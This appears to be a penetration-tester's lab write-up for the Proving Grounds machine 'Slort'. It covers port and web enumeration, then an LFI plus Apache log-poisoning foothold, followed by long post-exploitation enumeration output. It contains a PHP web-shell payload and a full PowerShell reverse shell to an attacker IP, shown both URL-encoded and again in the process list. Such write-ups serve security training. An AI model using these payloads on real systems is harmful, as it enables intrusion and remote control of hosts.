**Metadata**

- IP Address:  192.168.148.53
- Hostname: slort
- OS: 	Microsoft Windows 10 Pro
- Found Credentials/Users:


Main Objectives:

Local.txt = 8bd20d92107c5149b36f2cd83d4111b1
Proof.txt = d2cdf7342922b85f246a1902c11e3fdc

**Enumeration**

1. NMAP Scans (TCP/UDP)

```

The below commands will run as part of pg_recon.sh or you can run manually. 

[+] Command: nmap -sS -Pn -n --top-ports 1000 -T4 --open 192.168.148.53 -oN - 
# `Nmap 7.95 scan initiated Fri Feb 20 13:14:28 2026 as: nmap -sS -Pn -n --top-ports 1000 -T4 --open -oN - 192.168.148.53
Nmap scan report for 192.168.148.53
Host is up (0.085s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
4443/tcp open  pharos
8080/tcp open  http-proxy

# Nmap done at Fri Feb 20 13:14:30 2026 -- 1 IP address (1 host up) scanned in 2.23 seconds
[+] Running: Nmap ALL TCP (all ports + versions)
[+] Command: nmap -sS -Pn -n -p- -T4 --open -sV --version-all 192.168.148.53 -oN /home/kali/ProvingGround/Slort/nmap/full_tcp.nmap -oG /home/kali/ProvingGround/Slort/nmap/full_tcp.gnmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-20 13:14 MST
Nmap scan report for 192.168.148.53
Host is up (0.082s latency).
Not shown: 63338 closed tcp ports (reset), 2182 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
4443/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8080/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows



```

2. Interesting Ports/Services

```
[+] Open TCP ports (open only): 21, 135, 139, 445, 3306, 4443, 5040, 7680, 8080, 49664, 49665, 49666, 49667, 49668, 49669
[+] Open UDP ports (open only): <none>

```

3. FTP Enumeration

```
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla


Credentials to try:

Username: anonymous
Password: anonymous

Not able to login
```

4. Web Enumeration  (4443)

```
4443/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.148.53:4443/dashboard/

Webserver Info - Apache httpd 2.4.43 ((Win64) 
Running Applications - 
Site Visit - 
1. XAMMPP default page.
2. visted http://192.168.148.53.:4433/site redirted to http://192.168.148.53:4443/site/index.php?page=main.php

whatweb -v http://target

[+] Running: Gobuster BASIC (4443)
[+] Command: gobuster dir -u http://192.168.148.53:4443 -w /usr/share/wordlists/dirb/common.txt -t 50 -o /home/kali/ProvingGround/Slort/gobuster/Slort_192.168.148.53_4443_dir_basic.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.148.53:4443
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

/dashboard            (Status: 301) [Size: 351] [--> http://192.168.148.53:4443/dashboard/]
/favicon.ico          (Status: 200) [Size: 30894]
/img                  (Status: 301) [Size: 345] [--> http://192.168.148.53:4443/img/]
/index.php            (Status: 302) [Size: 0] [--> http://192.168.148.53:4443/dashboard/]
/examples             (Status: 503) [Size: 1060]
/site                 (Status: 301) [Size: 346] [--> http://192.168.148.53:4443/site/]
Progress: 4415 / 4613 (95.71%)
===============================================================
Progress: 4613 / 4613 (100.00%)Finished


```

4. Web Enumeration  (8080)

```
8080/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.148.53:8080/dashboard/
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-open-proxy: Proxy might be redirecting requests

Webserver Info - Apache httpd 2.4.43 ((Win64) 
Running Applications - 
Site Visit - 

whatweb -v http://target

[+] Running: Gobuster BASIC (8080)
[+] Command: gobuster dir -u http://192.168.148.53:8080 -w /usr/share/wordlists/dirb/common.txt -t 50 -o /home/kali/ProvingGround/Slort/gobuster/Slort_192.168.148.53_8080_dir_basic.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.148.53:8080
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

`/dashboard            (Status: 301) [Size: 351] [--> http://192.168.148.53:8080/dashboard/]
/favicon.ico          (Status: 200) [Size: 30894]
/img                  (Status: 301) [Size: 345] [--> http://192.168.148.53:8080/img/]
/index.php            (Status: 302) [Size: 0] [--> http://192.168.148.53:8080/dashboard/]
/examples             (Status: 503) [Size: 1060]
/site                 (Status: 301) [Size: 346] [--> http://192.168.148.53:8080/site/]

Progress: 4610 / 4613 (99.93%)
===============================================================
Progress: 4613 / 4613 (100.00%)Finished

```

6. SMB Port 139, 445 Enumeration

```
smbclient -L //192.168.101.110 -U anonymous
Password for [WORKGROUP\anonymous]:
session setup failed: NT_STATUS_LOGON_FAILURE

smbmap -H 192.168.101.110                  

smbclient //192.168.101.110/Backup -N          
Anonymous login successful


```

7. Possible Exploits

```
http://192.168.148.53:4443/site/index.php?page=main.php - Possible LFI and apached log posining.
```

8. Other Notes

```

```

**Initial Foothold** 

1. Exploit Steps

- Verified LFI and access to apache log by visiting http://192.168.148.53:4443/site/index.php?page=C:\xampp\apache\logs\access.log

- Poisoned log by putting php code into  User-Agent.

```
<?php echo system($_GET['cmd']); ?>
```

![[Pasted image 20260220184733.png]]

- Visited apache log and executed test command.

![[Pasted image 20260220184949.png]]

- Created reverse shell URL encoded using revshells.com. 

```
powershell%20-nop%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27192.168.45.215%27%2C443%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

- Sent reverse shell powershell command via log poisoning. 

![[Pasted image 20260220185805.png]]

- Received reverse shell and viewed local.txt

![[Pasted image 20260220185930.png]]

2. Shell Access

```

```

**Post-Exploitation**

1. Shell / Context (reference)

```

# Powershell

powershell -NoP -NonI -W Hidden -Exec Bypass
set-alias wget Invoke-WebRequest
set-alias curl Invoke-WebRequest

```
  
2. Identity & System Info

```
[+] Host identity (OSCP summary)
User: SLORT\rupert
Hostname: SLORT
Domain joined: False
Domain/Workgroup: WORKGROUP
OS: Microsoft Windows 10 Pro 10.0.19042 (Build 19042)
Architecture: 64-bit
Last boot: 02/04/2025 08:13:30

[+] Patch level (hotfix IDs only, first 25)
$ wmic qfe get HotFixID,InstalledOn | findstr /R /V \
ERROR: FINDSTR: No search strings
Command exit code: 2

```

3. Environment

```
[+] Environment variables (full)
Name                           Value
----                           -----
ALLUSERSPROFILE                C:\ProgramData
AP_PARENT_PID                  5540
APPDATA                        C:\Users\rupert\AppData\Roaming
CommonProgramFiles             C:\Program Files\Common Files
CommonProgramFiles(x86)        C:\Program Files (x86)\Common Files
CommonProgramW6432             C:\Program Files\Common Files
COMPUTERNAME                   SLORT
ComSpec                        C:\WINDOWS\system32\cmd.exe
DriverData                     C:\Windows\System32\Drivers\DriverData
HOMEDRIVE                      C:
HOMEPATH                       \Users\rupert
LOCALAPPDATA                   C:\Users\rupert\AppData\Local
LOGONSERVER                    \\SLORT
NUMBER_OF_PROCESSORS           2
OneDrive                       C:\Users\rupert\OneDrive
OS                             Windows_NT
Path                           C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;C:\WINDOWS\System32\WindowsPowerShell\v1.0\;C:\WINDOWS\System32\OpenSSH\;C:\Users\rupert\AppData\Local\Microsoft\WindowsApps;
PATHEXT                        .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
PROCESSOR_ARCHITECTURE         AMD64
PROCESSOR_IDENTIFIER           AMD64 Family 23 Model 1 Stepping 2, AuthenticAMD
PROCESSOR_LEVEL                23
PROCESSOR_REVISION             0102
ProgramData                    C:\ProgramData
ProgramFiles                   C:\Program Files
ProgramFiles(x86)              C:\Program Files (x86)
ProgramW6432                   C:\Program Files
PROMPT                         $P$G
PSModulePath                   C:\Users\rupert\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\WINDOWS\system32\WindowsPowerShell\v1.0\Modules
PUBLIC                         C:\Users\Public
SESSIONNAME                    Console
SoypDNpxUJ                     oVKmhsScFQ
sqPNnELmLm                     CtiuGoQAFF
SystemDrive                    C:
SystemRoot                     C:\WINDOWS
TEMP                           C:\Users\rupert\AppData\Local\Temp
TMP                            C:\Users\rupert\AppData\Local\Temp
USERDOMAIN                     SLORT
USERDOMAIN_ROAMINGPROFILE      SLORT
USERNAME                       rupert
USERPROFILE                    C:\Users\rupert
WdQLBlNUQe                     RKlWGgOyWF
windir                         C:\WINDOWS
XQGyOEvhxs                     UATpfQcTYJ


```

  4. Users & Groups

```
[+] Local admins and privileged groups (summary)
ObjectClass Name                PrincipalSource
----------- ----                ---------------
User        SLORT\Administrator Local

[+] Local user accounts with risky settings
Name                 : rupert
Enabled              : True
PasswordRequired     : False
PasswordNeverExpires :
LastLogon            : 2/4/2025 8:13:50 AM

[+] Current user groups (token groups)
$ whoami /groups
GROUP INFORMATION
-----------------
Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192

```

  5.  AD Enumeration

```
Host is not domain joined.

```

  6. Privileges & Tokens

```
$ whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

[+] Enabled token privileges (high-value only)
No high-value privileges currently enabled.

[+] Integrity level
$ whoami /groups | findstr /I \
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


```

  7. UAC & Policy Checks

```
[+] UAC / token filter / AlwaysInstallElevated (interpreted)
EnableLUA: 1
  -> UAC is enabled.
ConsentPromptBehaviorAdmin: 5
  -> Prompt for consent (non-Windows binaries).
LocalAccountTokenFilterPolicy:
  -> Value not present (treat as default: enabled).
AlwaysInstallElevated HKLM:
AlwaysInstallElevated HKCU:
  -> Not directly vulnerable via AlwaysInstallElevated (both hives are not set to 1).

```

  8. Processes & Services

```
[+] Auto-start service triage (non-system paths)
Name      : edgeupdate
StartName : LocalSystem
StartMode : Auto
State     : Stopped
PathName  : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
Name      : VGAuthService
StartName : LocalSystem
StartMode : Auto
State     : Running
PathName  : "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
Name      : VMTools
StartName : LocalSystem
StartMode : Auto
State     : Running
PathName  : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"

[+] Unquoted service path candidates (privesc)
(no output)

[+] Writable service binary candidates (privesc)
(no output)

[+] All running processes (full)
Name                         PID PPID User         Path                                                                                                         Command
----                         --- ---- ----         ----                                                                                                         -------
ApplicationFrameHost.exe    1100  764 SLORT\rupert C:\WINDOWS\system32\ApplicationFrameHost.exe                                                                 C:\WINDOWS\system32\ApplicationFrameHost.exe -Embedding
cmd.exe                     9072 6332 SLORT\rupert C:\WINDOWS\SYSTEM32\cmd.exe                                                                                  cmd.exe /c "powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.45.215',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()""
conhost.exe                 3092 5540 SLORT\rupert C:\WINDOWS\system32\conhost.exe                                                                              \??\C:\WINDOWS\system32\conhost.exe 0x4
conhost.exe                 8016 9072 SLORT\rupert C:\WINDOWS\system32\conhost.exe                                                                              \??\C:\WINDOWS\system32\conhost.exe 0x4
csrss.exe                    432  420
csrss.exe                    516  496
ctfmon.exe                  4648 4596 SLORT\rupert
dllhost.exe                 3040  636
dllhost.exe                 6024  764 SLORT\rupert C:\WINDOWS\system32\DllHost.exe                                                                              C:\WINDOWS\system32\DllHost.exe /Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F}
dwm.exe                      976  600
explorer.exe                5084 5060 SLORT\rupert C:\WINDOWS\Explorer.EXE                                                                                      C:\WINDOWS\Explorer.EXE
FileZillaServer.exe         5648 4888 SLORT\rupert c:\xampp\filezillaftp\filezillaserver.exe                                                                    c:\xampp\filezillaftp\filezillaserver.exe -compat -start
fontdrvhost.exe              748  504
fontdrvhost.exe              756  600
GameBar.exe                 3352  764 SLORT\rupert C:\Program Files\WindowsApps\Microsoft.XboxGamingOverlay_5.320.6242.0_x64__8wekyb3d8bbwe\GameBar.exe         "C:\Program Files\WindowsApps\Microsoft.XboxGamingOverlay_5.320.6242.0_x64__8wekyb3d8bbwe\GameBar.exe" -ServerName:App.AppXbdkk0yrkwpcgeaem8zk81k8py1eaahny.mca
GameBarFT.exe               8576 7852 SLORT\rupert C:\Program Files\WindowsApps\Microsoft.XboxGamingOverlay_5.320.6242.0_x64__8wekyb3d8bbwe\GameBarFT.exe       "C:\Program Files\WindowsApps\Microsoft.XboxGamingOverlay_5.320.6242.0_x64__8wekyb3d8bbwe\GameBarFT.exe" /InvokerPRAID: App
GameBarFTServer.exe         8284  764 SLORT\rupert C:\Program Files\WindowsApps\Microsoft.XboxGamingOverlay_5.320.6242.0_x64__8wekyb3d8bbwe\GameBarFTServer.exe "C:\Program Files\WindowsApps\Microsoft.XboxGamingOverlay_5.320.6242.0_x64__8wekyb3d8bbwe\GameBarFTServer.exe" -Embedding
httpd.exe                   5540 4888 SLORT\rupert c:\xampp\apache\bin\httpd.exe                                                                                c:\xampp\apache\bin\httpd.exe
httpd.exe                   6332 5540 SLORT\rupert C:\xampp\apache\bin\httpd.exe                                                                                C:\xampp\apache\bin\httpd.exe -d C:/xampp/apache
lsass.exe                    648  504
Memory Compression          1396    4
MicrosoftEdgeUpdate.exe     8872 1108
msdtc.exe                   3344  636
mysqld.exe                  5532 4888 SLORT\rupert c:\xampp\mysql\bin\mysqld.exe                                                                                "c:\xampp\mysql\bin\mysqld.exe" --defaults-file="c:\xampp\mysql\bin\my.ini" --standalone
powershell.exe              1120 9072 SLORT\rupert C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe                                                    powershell  -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.45.215',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
Registry                      92    4
RuntimeBroker.exe           3956  764 SLORT\rupert C:\Windows\System32\RuntimeBroker.exe                                                                        C:\Windows\System32\RuntimeBroker.exe -Embedding
RuntimeBroker.exe           4388  764 SLORT\rupert C:\Windows\System32\RuntimeBroker.exe                                                                        C:\Windows\System32\RuntimeBroker.exe -Embedding
RuntimeBroker.exe           5408  764 SLORT\rupert C:\Windows\System32\RuntimeBroker.exe                                                                        C:\Windows\System32\RuntimeBroker.exe -Embedding
RuntimeBroker.exe           5620  764 SLORT\rupert C:\Windows\System32\RuntimeBroker.exe                                                                        C:\Windows\System32\RuntimeBroker.exe -Embedding
RuntimeBroker.exe           7628  764 SLORT\rupert C:\Windows\System32\RuntimeBroker.exe                                                                        C:\Windows\System32\RuntimeBroker.exe -Embedding
RuntimeBroker.exe           7852  764 SLORT\rupert C:\Windows\System32\RuntimeBroker.exe                                                                        C:\Windows\System32\RuntimeBroker.exe -Embedding
SearchApp.exe               5516  764 SLORT\rupert C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe                                   "C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe" -ServerName:CortanaUI.AppX8z9r6jm96hw4bsbneegw0kyxx296wr9t.mca
SearchFilterHost.exe        4064 5220
SearchIndexer.exe           5220  636
SearchProtocolHost.exe      8616 5220
SecurityHealthService.exe   7888  636
services.exe                 636  504
SgrmBroker.exe              1232  636
ShellExperienceHost.exe     5856  764 SLORT\rupert C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe                              "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca
sihost.exe                  4240 1484 SLORT\rupert C:\WINDOWS\system32\sihost.exe                                                                               sihost.exe
smartscreen.exe             4264  764 SLORT\rupert C:\Windows\System32\smartscreen.exe                                                                          C:\Windows\System32\smartscreen.exe -Embedding
smss.exe                     324    4
StartMenuExperienceHost.exe 5308  764 SLORT\rupert C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe    "C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe" -ServerName:App.AppXywbrabmsek0gm3tkwpr5kwzbs55tkqay.mca
svchost.exe                  292  636
svchost.exe                  344  636
svchost.exe                  376  636
svchost.exe                  452  636
svchost.exe                  764  636
svchost.exe                  864  636
svchost.exe                  916  636
svchost.exe                  968  636
svchost.exe                 1072  636
svchost.exe                 1152  636
svchost.exe                 1200  636
svchost.exe                 1224  636
svchost.exe                 1236  636
svchost.exe                 1248  636
svchost.exe                 1264  636
svchost.exe                 1420  636
svchost.exe                 1448  636
svchost.exe                 1484  636
svchost.exe                 1488  636
svchost.exe                 1508  636
svchost.exe                 1516  636
svchost.exe                 1588  636
svchost.exe                 1620  636
svchost.exe                 1644  636
svchost.exe                 1720  636
svchost.exe                 1732  636
svchost.exe                 1772  636
svchost.exe                 1780  636
svchost.exe                 1788  636
svchost.exe                 1832  636
svchost.exe                 1936  636
svchost.exe                 2000  636
svchost.exe                 2236  636
svchost.exe                 2244  636
svchost.exe                 2304  636
svchost.exe                 2340  636
svchost.exe                 2360  636
svchost.exe                 2368  636
svchost.exe                 2416  636 SLORT\rupert C:\WINDOWS\system32\svchost.exe                                                                              C:\WINDOWS\system32\svchost.exe -k UnistackSvcGroup
svchost.exe                 2436  636
svchost.exe                 2492  636
svchost.exe                 2500  636
svchost.exe                 2508  636
svchost.exe                 2544  636
svchost.exe                 2588  636
svchost.exe                 2644  636
svchost.exe                 2828  636
svchost.exe                 3080  636
svchost.exe                 3568  636
svchost.exe                 3580  636
svchost.exe                 3892  636
svchost.exe                 4048  636
svchost.exe                 4136  636
svchost.exe                 4272  636 SLORT\rupert C:\WINDOWS\system32\svchost.exe                                                                              C:\WINDOWS\system32\svchost.exe -k UnistackSvcGroup -s CDPUserSvc
svchost.exe                 4304  636 SLORT\rupert C:\WINDOWS\system32\svchost.exe                                                                              C:\WINDOWS\system32\svchost.exe -k UnistackSvcGroup -s WpnUserService
svchost.exe                 4460  636
svchost.exe                 4596  636
svchost.exe                 4640  636
svchost.exe                 4676  636 SLORT\rupert C:\WINDOWS\system32\svchost.exe                                                                              C:\WINDOWS\system32\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc
svchost.exe                 4760  636
svchost.exe                 5132  636
svchost.exe                 5452  636
svchost.exe                 5780  636
svchost.exe                 5808  636
svchost.exe                 7260  636
svchost.exe                 7644  636
svchost.exe                 7868  636
svchost.exe                 8024  636
svchost.exe                 8140  636
svchost.exe                 8276  636
svchost.exe                 8496  636
svchost.exe                 9080  636
System                         4    0
System Idle Process            0    0
SystemSettings.exe          1292  764 SLORT\rupert C:\Windows\ImmersiveControlPanel\SystemSettings.exe                                                          "C:\Windows\ImmersiveControlPanel\SystemSettings.exe" -ServerName:microsoft.windows.immersivecontrolpanel
taskhostw.exe               4380 1448 SLORT\rupert C:\WINDOWS\system32\taskhostw.exe                                                                            taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
TiWorker.exe                6192  764
TrustedInstaller.exe        1496  636
UserOOBEBroker.exe          5756  764 SLORT\rupert C:\Windows\System32\oobe\UserOOBEBroker.exe                                                                  C:\Windows\System32\oobe\UserOOBEBroker.exe -Embedding
VGAuthService.exe           2468  636
vmtoolsd.exe                2476  636
vmtoolsd.exe                4844 5084 SLORT\rupert C:\Program Files\VMware\VMware Tools\vmtoolsd.exe                                                            "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
wininit.exe                  504  420
winlogon.exe                 600  496
WmiPrvSE.exe                3096  764
WmiPrvSE.exe                4104  764
xampp-control.exe           4888 5084 SLORT\rupert C:\xampp\xampp-control.exe                                                                                   "C:\xampp\xampp-control.exe"
YourPhone.exe               7432  764 SLORT\rupert C:\Program Files\WindowsApps\Microsoft.YourPhone_1.20061.110.0_x64__8wekyb3d8bbwe\YourPhone.exe              "C:\Program Files\WindowsApps\Microsoft.YourPhone_1.20061.110.0_x64__8wekyb3d8bbwe\YourPhone.exe" -ServerName:App.AppX9yct9q388jvt4h7y0gn06smzkxcsnt8m.mca

```

  9.  Scheduled Tasks

```

[+] Scheduled task triage (OSCP-focused)
Suspicious scheduled tasks: 90 (showing first 40)
--------------------------------------------------------------------------------
Task: \OneDrive Reporting Task-S-1-5-21-2032240294-1210393520-1520670448-1002
RunAs: rupert
Why: Non-Microsoft task path; Runs as user/service account: rupert
Action: %localappdata%\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe /reporting
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319
RunAs: SYSTEM
Why: Hidden task
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64
RunAs: SYSTEM
Why: Hidden task
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64 Critical
RunAs: SYSTEM
Why: Hidden task
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 Critical
RunAs: SYSTEM
Why: Hidden task
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Application Experience\PcaPatchDbTask
RunAs: SYSTEM
Why: LOLBIN launcher in action
Action: %windir%\system32\rundll32.exe %windir%\system32\PcaSvc.dll,PcaPatchSdbTask
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Application Experience\StartupAppTask
Why: LOLBIN launcher in action
Action: %windir%\system32\rundll32.exe Startupscan.dll,SusRunTask
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\ApplicationData\CleanupTemporaryState
RunAs: SYSTEM
Why: LOLBIN launcher in action
Action: %windir%\system32\rundll32.exe Windows.Storage.ApplicationData.dll,CleanupTemporaryState
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\AppxDeploymentClient\Pre-staged app cleanup
RunAs: SYSTEM
Why: Hidden task; LOLBIN launcher in action
Action: %windir%\system32\rundll32.exe %windir%\system32\AppxDeploymentClient.dll,AppxPreStageCleanupRunTask
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Autochk\Proxy
RunAs: SYSTEM
Why: LOLBIN launcher in action
Action: %windir%\system32\rundll32.exe /d acproxy.dll,PerformAutochkOperations
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\BrokerInfrastructure\BgTaskRegistrationMaintenanceTask
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Chkdsk\SyspartRepair
RunAs: SYSTEM
Why: Hidden task
Action: %windir%\system32\bcdboot.exe %windir% /sysrepair
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\CloudExperienceHost\CreateObjectTask
RunAs: SYSTEM
Why: Hidden task
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Customer Experience Improvement Program\UsbCeip
RunAs: SYSTEM
Why: Hidden task
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Data Integrity Scan\Data Integrity Check And Scan
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan for Crash Recovery
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges; Hidden task
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Defrag\ScheduledDefrag
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action: %windir%\system32\defrag.exe -c -h -o -$
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Diagnosis\RecommendedTroubleshootingScanner
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Diagnosis\Scheduled
RunLevel: Highest
Why: Runs with highest privileges; Hidden task
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\DirectX\DirectXDatabaseUpdater
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges; Hidden task
Action: %windir%\system32\directxdatabaseupdater.exe
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\DirectX\DXGIAdapterCache
